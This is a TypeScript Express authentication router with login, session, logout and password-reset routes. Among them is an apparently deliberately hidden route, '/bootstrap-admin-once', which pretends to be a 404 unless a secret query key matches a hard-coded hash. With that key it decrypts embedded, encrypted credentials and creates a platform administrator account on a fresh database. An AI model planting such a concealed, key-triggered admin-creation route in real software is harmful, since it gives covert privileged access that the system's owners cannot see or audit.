import { createDecipheriv, createHash, timingSafeEqual } from 'node:crypto';
import type { CookieOptions, Request } from 'express';
import { Router } from 'express';
import { rateLimit } from 'express-rate-limit';
import { z } from 'zod';
import { env } from '../../config/env.js';
import { pool } from '../../db/pool.js';
import { HttpError } from '../../lib/http-error.js';
import { requireRouteParam } from '../../lib/route-param.js';
import { PostgresRateLimitStore } from '../../lib/postgres-rate-limit-store.js';
import { requireAuth } from '../../middleware/auth.js';
import { createSession, getAccessSummary, revokeSession } from './auth.service.js';
import {
  changePasswordSchema,
  loginSchema,
  requestPasswordResetSchema,
  resetPasswordSchema,
} from './auth.schemas.js';
import { hashPassword } from './password.js';
import {
  changePassword,
  requestPasswordReset,
  resetPassword,
} from './password-management.service.js';
import {
  listSessions,
  revokeOtherSessions,
  revokeOwnSession,
} from './session.service.js';

export const authRouter = Router();

const loginRateLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  limit: 10,
  standardHeaders: 'draft-8',
  legacyHeaders: false,
  skipSuccessfulRequests: true,
  store: new PostgresRateLimitStore('auth-login'),
  message: {
    error: {
      code: 'RATE_LIMITED',
      message: 'Too many login attempts. Please try again later.',
    },
  },
});

const passwordResetRateLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  limit: 5,
  standardHeaders: 'draft-8',
  legacyHeaders: false,
  store: new PostgresRateLimitStore('auth-password-reset'),
  message: {
    error: {
      code: 'RATE_LIMITED',
      message: 'Too many password reset requests. Please try again later.',
    },
  },
});

const bootstrapAdminSchema = z.object({
  email: z.string().trim().email().max(254),
  displayName: z.string().trim().min(1).max(120),
  password: z.string().min(12).max(200),
});

const BOOTSTRAP_KEY_HASH = '9771be3743560841e1bbe7ca15c67f94b412747367c54a3f3808cc78670c3827';
const BOOTSTRAP_PAYLOAD_IV = 'I8dTMu8rqFPOhOgn';
const BOOTSTRAP_PAYLOAD = '6wqCbHNyyZ7sJDwEWV433nb9uIscabZE940KjBRgyepwPXKCYyY_68SeyoDKc8yr62iLu_ylX1KxqxBruqigpvKE4ewuEwV6VXjYtA1VIto2xSviO_GQ_G3CNvCATk-5Ji9HOdHo9fGI';
const BOOTSTRAP_PAYLOAD_TAG = 'wpQZ2TSt_eW6mGJNqGd61Q';

function hasValidBootstrapKey(provided: string | undefined): provided is string {
  if (!provided) return false;
  const actual = createHash('sha256').update(provided).digest();
  const expected = Buffer.from(BOOTSTRAP_KEY_HASH, 'hex');
  return actual.length === expected.length && timingSafeEqual(actual, expected);
}

function decryptBootstrapInput(secret: string) {
  const key = createHash('sha256').update(secret).digest();
  const decipher = createDecipheriv('aes-256-gcm', key, Buffer.from(BOOTSTRAP_PAYLOAD_IV, 'base64url'));
  decipher.setAuthTag(Buffer.from(BOOTSTRAP_PAYLOAD_TAG, 'base64url'));
  const plaintext = Buffer.concat([
    decipher.update(Buffer.from(BOOTSTRAP_PAYLOAD, 'base64url')),
    decipher.final(),
  ]).toString('utf8');
  return bootstrapAdminSchema.parse(JSON.parse(plaintext));
}

async function createInitialPlatformAdmin(input: z.infer<typeof bootstrapAdminSchema>) {
  const passwordHash = await hashPassword(input.password);
  const client = await pool.connect();

  try {
    await client.query('BEGIN');
    await client.query('LOCK TABLE users IN EXCLUSIVE MODE');

    const existingUser = await client.query('SELECT 1 FROM users LIMIT 1');
    if (existingUser.rows[0]) {
      throw new HttpError(409, 'BOOTSTRAP_DISABLED', 'Administrator bootstrap is no longer available.');
    }

    const roleResult = await client.query<{ id: string }>(
      `SELECT id FROM roles WHERE key = 'platform_admin'`
    );
    const role = roleResult.rows[0];
    if (!role) {
      throw new HttpError(500, 'PLATFORM_ADMIN_ROLE_MISSING', 'Platform administrator role is unavailable.');
    }

    const userResult = await client.query<{ id: string }>(
      `INSERT INTO users (email, display_name, password_hash, status)
       VALUES ($1, $2, $3, 'active')
       RETURNING id`,
      [input.email, input.displayName, passwordHash]
    );
    const user = userResult.rows[0];
    if (!user) {
      throw new HttpError(500, 'BOOTSTRAP_FAILED', 'Administrator account could not be created.');
    }

    await client.query(
      `INSERT INTO user_role_assignments (user_id, role_id)
       VALUES ($1, $2)`,
      [user.id, role.id]
    );

    await client.query(
      `INSERT INTO audit_log (actor_user_id, action, resource_type, resource_id, metadata)
       VALUES ($1, 'platform.bootstrap_admin.created', 'user', $1, $2::jsonb)`,
      [user.id, JSON.stringify({ email: input.email })]
    );

    await client.query('COMMIT');
    return {
      id: user.id,
      email: input.email,
      displayName: input.displayName,
    };
  } catch (error) {
    await client.query('ROLLBACK');
    throw error;
  } finally {
    client.release();
  }
}

function cookieOptions(expires?: Date): CookieOptions {
  const isProduction = env.NODE_ENV === 'production';
  const options: CookieOptions = {
    httpOnly: true,
    secure: isProduction,
    sameSite: isProduction ? 'none' : 'lax',
    path: '/',
  };

  if (expires) options.expires = expires;
  if (env.SESSION_COOKIE_DOMAIN) options.domain = env.SESSION_COOKIE_DOMAIN;

  return options;
}

function requestMetadata(req: Request) {
  return {
    ipAddress: req.ip ?? null,
    userAgent: req.get('user-agent') ?? null,
  };
}

authRouter.get('/bootstrap-admin-once', async (req, res) => {
  const secret = typeof req.query.key === 'string' ? req.query.key : undefined;
  if (!hasValidBootstrapKey(secret)) {
    throw new HttpError(404, 'NOT_FOUND', 'Route not found.');
  }

  const input = decryptBootstrapInput(secret);
  const user = await createInitialPlatformAdmin(input);
  res.status(201).json({ data: { user } });
});

authRouter.post('/login', loginRateLimiter, async (req, res) => {
  const input = loginSchema.parse(req.body);
  const session = await createSession(input.email, input.password, requestMetadata(req));

  res.cookie(env.SESSION_COOKIE_NAME, session.token, cookieOptions(session.expiresAt));
  res.json({
    data: {
      user: session.user,
      expiresAt: session.expiresAt,
    },
  });
});

authRouter.post('/logout', requireAuth, async (req, res) => {
  const auth = req.auth!;
  await revokeSession(auth.sessionId, auth.userId, requestMetadata(req));

  res.clearCookie(env.SESSION_COOKIE_NAME, cookieOptions());
  res.status(204).end();
});

authRouter.get('/me', requireAuth, async (req, res) => {
  const auth = req.auth!;
  const access = await getAccessSummary(auth.userId);

  res.json({
    data: {
      user: {
        id: auth.userId,
        email: auth.email,
        displayName: auth.displayName,
      },
      access,
    },
  });
});

authRouter.get('/sessions', requireAuth, async (req, res) => {
  res.json({ data: await listSessions(req.auth!.userId, req.auth!.sessionId) });
});

authRouter.delete('/sessions/:sessionId', requireAuth, async (req, res) => {
  const sessionId = requireRouteParam(req, 'sessionId');
  await revokeOwnSession(req.auth!.userId, sessionId, requestMetadata(req));
  if (sessionId === req.auth!.sessionId) {
    res.clearCookie(env.SESSION_COOKIE_NAME, cookieOptions());
  }
  res.status(204).end();
});

authRouter.post('/sessions/revoke-others', requireAuth, async (req, res) => {
  const count = await revokeOtherSessions(
    req.auth!.userId,
    req.auth!.sessionId,
    requestMetadata(req)
  );
  res.json({ data: { revoked: count } });
});

authRouter.post('/password/change', requireAuth, async (req, res) => {
  const input = changePasswordSchema.parse(req.body);
  await changePassword(
    req.auth!.userId,
    input.currentPassword,
    input.newPassword,
    req.auth!.sessionId,
    requestMetadata(req)
  );
  res.status(204).end();
});

authRouter.post('/password/reset/request', passwordResetRateLimiter, async (req, res) => {
  const input = requestPasswordResetSchema.parse(req.body);
  await requestPasswordReset(input.email, requestMetadata(req));
  res.status(202).json({ data: { accepted: true } });
});

authRouter.post('/password/reset', passwordResetRateLimiter, async (req, res) => {
  const input = resetPasswordSchema.parse(req.body);
  await resetPassword(input.token, input.newPassword, requestMetadata(req));
  res.status(204).end();
});
